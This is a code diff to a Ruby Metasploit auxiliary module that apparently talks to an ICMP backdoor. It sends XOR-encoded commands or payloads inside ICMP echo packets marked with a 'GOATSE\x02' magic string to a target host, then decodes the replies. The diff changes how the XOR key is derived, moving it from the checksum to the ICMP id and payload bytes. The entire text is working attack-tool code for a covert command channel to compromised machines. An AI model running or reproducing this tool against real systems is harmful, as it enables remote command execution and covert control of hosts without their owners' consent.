@@ -59,7 +59,9 @@ class Metasploit3 < Msf::Auxiliary
           next unless p.is_icmp?
 	  next unless p.ip_saddr == ip
     
-          key = (p.icmp_sum & 0xff) ^ ((p.icmp_sum >> 8) & 0xff)
+          #key = (p.icmp_sum & 0xff) ^ ((p.icmp_sum >> 8) & 0xff)
+          key = (p.payload.each_byte.to_a[0] ^ p.payload.each_byte.to_a[1]) & 0xff
+         
           decoded = p.payload.each_byte.map {|c| (c^key).chr }.join
 
           if decoded[4..10] == "GOATSE\x02"
@@ -82,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def build_icmp(ip)
-    chksum = rand(65535) + 1
+    icmp_id = rand(65535) + 1
     
     if datastore['CMD'].nil? || datastore['CMD'] == ''
       if datastore['PAYLOAD'].nil? || datastore['PAYLOAD'] == ''
@@ -94,16 +96,15 @@ class Metasploit3 < Msf::Auxiliary
       data = "GOATSE\x02" + datastore['CMD'] + "\x00"
     end
 
-    key = (chksum & 0xff) ^ ((chksum >> 8) & 0xff)
+    key = (icmp_id & 0xff) ^ ((icmp_id >> 8) & 0xff)
        
     p = PacketFu::ICMPPacket.new
     p.icmp_type = 8
     p.icmp_code = 0
     p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
     p.ip_daddr = ip
-    p.payload = capture_icmp_echo_pack(rand(65535) + 1, rand(65535) + 1, data.each_byte.map {|c| (c^key).chr }.join)
+    p.payload = capture_icmp_echo_pack(icmp_id, rand(65535) + 1, data.each_byte.map {|c| (c^key).chr }.join)
     p.recalc
-    p.icmp_sum = chksum & 0xffff
     return p
   end
 end
